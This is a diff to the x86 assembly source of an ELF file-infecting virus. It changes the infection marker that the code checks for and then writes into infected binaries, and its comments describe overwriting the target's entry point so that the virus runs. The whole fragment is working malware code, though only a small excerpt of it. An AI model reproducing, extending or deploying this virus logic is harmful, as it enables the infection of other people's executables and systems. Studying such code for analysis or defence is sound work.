@@ -117,7 +117,7 @@ elfheader:
     jnz close_file
 
     ; check if infected
-    mov ecx, 0x001edd0e
+    mov ecx, 0x11111111
     cmp dword [edi+2080+8], ecx
     jz close_file
 
@@ -209,7 +209,7 @@ program_header_loop:
     mov ebx, dword [edi+2080+eax+8]     ; virtual address in memory
     add ebx, edx                        ; new entry point
 
-    mov ecx, 0x001edd0e                 ; insert virus signature at byte 8
+    mov ecx, 0x11111111                 ; insert virus signature at byte 8
     mov [edi+2080+8], ecx
     mov [edi+2080+24], ebx              ; overwrite the old entry point with the virus (in buffer)
     add edx, v_stop - v_start
